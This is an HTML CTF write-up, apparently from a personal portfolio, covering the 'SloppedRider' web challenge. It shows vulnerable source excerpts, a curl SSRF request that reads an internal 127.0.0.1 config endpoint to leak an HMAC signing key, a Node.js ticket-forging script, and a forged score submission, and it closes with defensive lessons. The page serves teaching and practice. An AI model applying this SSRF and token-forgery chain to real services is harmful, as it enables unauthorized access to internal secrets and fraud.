@@ -1,0 +1,219 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>SloppedRider — Slopped CTF Writeup — Naim MyLibrary</title>
+  <meta name="description" content="Chained SSRF into an internal ops-service leak, recovered the score signing key, forged a ride ticket, and submitted the impossible score 676767." />
+  <link rel="stylesheet" href="../writeup-template.css" />
+</head>
+<body style="--accent:#61a8ff;--accent-2:#5cffb1;">
+  <main class="case-shell">
+    <nav class="case-nav" aria-label="Writeup navigation">
+      <a class="case-brand" href="../index.html">
+        <span class="case-mark">NM</span>
+        <span>Naim MyLibrary</span>
+      </a>
+      <div class="case-links">
+        <a href="../../index.html">Portfolio</a>
+        <a href="../index.html">Library</a>
+        <a href="#walkthrough">Walkthrough</a>
+        <a href="#flag">Flag</a>
+      </div>
+    </nav>
+
+    <header class="case-hero">
+      <section class="case-brief">
+        <p class="eyebrow">Slopped CTF Web casefile</p>
+        <h1>SloppedRider</h1>
+        <p class="lead">Chained SSRF into an internal ops-service leak, recovered the score signing key, forged a ride ticket, and submitted the impossible score 676767.</p>
+        <div class="meta-row">
+          <span class="chip">CTF: Slopped CTF</span>
+          <span class="chip">Category: Web</span>
+          <span class="chip">Difficulty: Medium</span>
+          <span class="chip">No points listed</span>
+          <span class="chip">Tags: SSRF · Internal Service · HMAC · Token Forgery · Source Review</span>
+        </div>
+      </section>
+
+      <aside class="case-panel" aria-label="Writeup status panel">
+        <div class="case-panel-inner">
+          <p class="eyebrow">mission telemetry</p>
+          <div class="status-line"><span>Status</span><strong>Solved</strong></div>
+          <div class="status-line"><span>Method</span><strong>Recon → Analyze → Proof</strong></div>
+          <div class="status-line"><span>Evidence</span><strong>Requests + screenshot</strong></div>
+          <div class="status-line"><span>Published</span><strong>2026-06-24</strong></div>
+          <div class="progress-track" aria-hidden="true"><span></span></div>
+          <p class="note" style="margin-top:18px;">This challenge is published as part of a separated Slopped CTF collection so it stays visually independent from boroCTF and kitCTF/GPNCTF.</p>
+        </div>
+      </aside>
+    </header>
+
+    <div class="case-layout">
+      <aside class="case-toc">
+        <p>Case index</p>
+        <a href="#overview">00 / Overview</a>
+        <a href="#skills">01 / Skills</a>
+        <a href="#timeline">02 / Timeline</a>
+        <a href="#walkthrough">03 / Walkthrough</a>
+        <a href="#evidence">04 / Evidence</a>
+        <a href="#flag">05 / Flag</a>
+        <a href="#lessons">06 / Lessons</a>
+      </aside>
+
+      <article class="case-body">
+        <section class="case-section" id="overview" data-step="00">
+          <p class="eyebrow">operator brief</p>
+          <h2>Overview</h2>
+          <p>Chained SSRF into an internal ops-service leak, recovered the score signing key, forged a ride ticket, and submitted the impossible score 676767.</p>
+          <div class="evidence-grid">
+            <div class="evidence-card"><strong>Challenge</strong><p>SloppedRider from Slopped CTF.</p></div>
+            <div class="evidence-card"><strong>Category</strong><p>Web · Medium difficulty.</p></div>
+          </div>
+        </section>
+
+        <section class="case-section" id="skills" data-step="01">
+          <p class="eyebrow">portfolio value</p>
+          <h2>Skills Demonstrated</h2>
+          <div class="skill-grid"><span>Source Code Review</span><span>SSRF Exploitation</span><span>Internal Service Enumeration</span><span>HMAC Ticket Forgery</span></div>
+        </section>
+
+        <section class="case-section" id="timeline" data-step="02">
+          <p class="eyebrow">solve path</p>
+          <h2>Timeline</h2>
+          <div class="timeline">
+            <div><strong>00</strong><p>Read the challenge description and identified the intended attack surface.</p></div>
+            <div><strong>01</strong><p>Collected the important clues from source, UI behavior, or evidence screenshots.</p></div>
+            <div><strong>02</strong><p>Built the working exploit path or confirmed enough locations to unlock the proof.</p></div>
+            <div><strong>03</strong><p>Recovered the flag and documented the chain cleanly.</p></div>
+          </div>
+        </section>
+
+        <section class="case-section" id="walkthrough" data-step="03">
+          <p class="eyebrow">solution notes</p>
+          <h2>Walkthrough</h2>
+          
+<h3>Challenge Description</h3>
+<p><strong>SloppedRider</strong> is a charity-themed chart-riding game. The player picks a market chart, rides the generated terrain, lands flips for bonus points, and submits a score to the global leaderboard.</p>
+<p>The target score is far above normal gameplay limits:</p>
+<div class="terminal"><div class="terminal-top"><span></span><span></span><span></span></div><pre>676,767</pre></div>
+<p>Reviewing the client and server logic showed that legitimate scores are capped at approximately 5,000 points, so the intended route was not normal gameplay.</p>
+
+<h3>Source Code Review</h3>
+<p>The application exposes a chart preview feature that accepts a user-controlled URL and fetches it server-side.</p>
+<div class="terminal"><div class="terminal-top"><span></span><span></span><span></span></div><pre>app.post(&quot;/api/chart/preview&quot;, async (req, res) =&gt; {
+  const feedUrl = String(req.body?.url || &quot;&quot;);
+
+  const result = await fetchUrl(feedUrl);
+  const json = JSON.parse(result.body);
+  ...
+});</pre></div>
+<p>The helper function selects an HTTP or HTTPS client directly from the provided URL.</p>
+<div class="terminal"><div class="terminal-top"><span></span><span></span><span></span></div><pre>function fetchUrl(rawUrl) {
+  ...
+  const client = parsed.protocol === &quot;https:&quot; ? https : http;
+  const req = client.request(parsed, ...);
+}</pre></div>
+<p>Because there is no destination host filtering, the endpoint is vulnerable to <strong>Server-Side Request Forgery</strong>.</p>
+
+<h3>Internal Service Discovery</h3>
+<p>Further inspection revealed an internal operations service on a local-only port.</p>
+<div class="terminal"><div class="terminal-top"><span></span><span></span><span></span></div><pre>const OPS_PORT = 43219;
+
+function createOpsServer() {
+  ...
+  if (pathPart === &quot;/ops/config&quot;) {
+    body = JSON.stringify({
+      service: &quot;sloppedrider-ops&quot;,
+      scoreKey: SCORE_KEY,
+      targetScore: TARGET_SCORE
+    });
+  }
+}</pre></div>
+<p>The service listens on <code>127.0.0.1:43219</code>. It is not reachable externally, but the SSRF primitive can request it from the server itself.</p>
+
+<h3>Leaking the Score Key</h3>
+<div class="terminal"><div class="terminal-top"><span></span><span></span><span></span></div><pre>curl -s http://178.105.199.41:8765/api/chart/preview   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;url&quot;:&quot;http://127.0.0.1:43219/ops/config&quot;}&#x27; </pre></div>
+<p>The endpoint rejects the result as an invalid chart, but the error response includes a <code>sample</code> field containing the fetched internal response.</p>
+<div class="terminal"><div class="terminal-top"><span></span><span></span><span></span></div><pre>{
+  &quot;error&quot;: &quot;chart feed must include 8-256 positive prices&quot;,
+  &quot;sample&quot;: &quot;{&quot;service&quot;:&quot;sloppedrider-ops&quot;,&quot;scoreKey&quot;:&quot;&lt;LEAKED_KEY&gt;&quot;,&quot;targetScore&quot;:676767,...}&quot;
+}</pre></div>
+
+<h3>Forging a Ride Ticket</h3>
+<p>Ride tickets use an HMAC signature over a base64url payload.</p>
+<div class="terminal"><div class="terminal-top"><span></span><span></span><span></span></div><pre>payload.signature
+signature = HMAC_SHA256(payload, SCORE_KEY)</pre></div>
+<p>Once the internal <code>SCORE_KEY</code> is leaked, a valid ticket with an arbitrary score cap can be forged.</p>
+<div class="terminal"><div class="terminal-top"><span></span><span></span><span></span></div><pre>const crypto = require(&quot;crypto&quot;);
+
+const SCORE_KEY = &quot;&lt;LEAKED_KEY&gt;&quot;;
+
+const payloadObj = {
+  v: 1,
+  kind: &quot;preview&quot;,
+  symbol: &quot;PWN&quot;,
+  period: &quot;custom&quot;,
+  cap: 676767,
+  iat: Math.floor(Date.now() / 1000)
+};
+
+const payload = Buffer
+  .from(JSON.stringify(payloadObj))
+  .toString(&quot;base64url&quot;);
+
+const sig = crypto
+  .createHmac(&quot;sha256&quot;, SCORE_KEY)
+  .update(payload)
+  .digest(&quot;base64url&quot;);
+
+console.log(payload + &quot;.&quot; + sig);</pre></div>
+
+<h3>Submitting the Impossible Score</h3>
+<div class="terminal"><div class="terminal-top"><span></span><span></span><span></span></div><pre>curl -s http://178.105.199.41:8765/api/score   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{
+    &quot;rideTicket&quot;:&quot;&lt;FORGED_TICKET&gt;&quot;,
+    &quot;score&quot;:676767,
+    &quot;nick&quot;:&quot;pwn&quot;
+  }&#x27; </pre></div>
+<p>The forged ticket is accepted, the score target is met, and the server returns the flag.</p>
+<div class="terminal"><div class="terminal-top"><span></span><span></span><span></span></div><pre>{
+  &quot;ok&quot;: true,
+  &quot;rank&quot;: 0,
+  &quot;flag&quot;: &quot;slopped{riding_0n_M3?}&quot;
+}</pre></div>
+
+        </section>
+
+        <section class="case-section" id="evidence" data-step="04">
+          <p class="eyebrow">proof locker</p>
+          <h2>Evidence</h2>
+          
+<div class="evidence-grid">
+  <div class="evidence-card"><strong>SSRF primitive</strong><p><code>/api/chart/preview</code> fetches an attacker-controlled URL with no host allowlist or private-network block.</p></div>
+  <div class="evidence-card"><strong>Internal target</strong><p>The ops service exposes <code>/ops/config</code> on <code>127.0.0.1:43219</code>.</p></div>
+  <div class="evidence-card"><strong>Secret leak</strong><p>The invalid-chart error includes the internal response in the <code>sample</code> field.</p></div>
+  <div class="evidence-card"><strong>Impact</strong><p>The leaked key allows valid HMAC ride tickets with the impossible score cap <code>676767</code>.</p></div>
+</div>
+
+        </section>
+
+        <section class="flag-vault" id="flag">
+          <p class="eyebrow">final artifact</p>
+          <h2>Flag</h2>
+          <code>slopped{riding_0n_M3?}</code>
+        </section>
+
+        <section class="case-section" id="lessons" data-step="06">
+          <p class="eyebrow">after action report</p>
+          <h2>Lessons Learned</h2>
+          <ul><li>Server-side fetch endpoints need strict host allowlists and private-address blocking.</li><li>Error responses should never echo sensitive internal service content.</li><li>HMAC signatures are only as strong as the secrecy of the signing key.</li><li>When gameplay limits make a target impossible, review the trust boundary around score submission.</li></ul>
+          <div class="footer-actions">
+            <a class="btn" href="../index.html">← Back to MyLibrary</a>
+            <a class="btn ghost" href="../../index.html">Back to Portfolio</a>
+          </div>
+        </section>
+      </article>
+    </div>
+  </main>
+</body>
+</html>
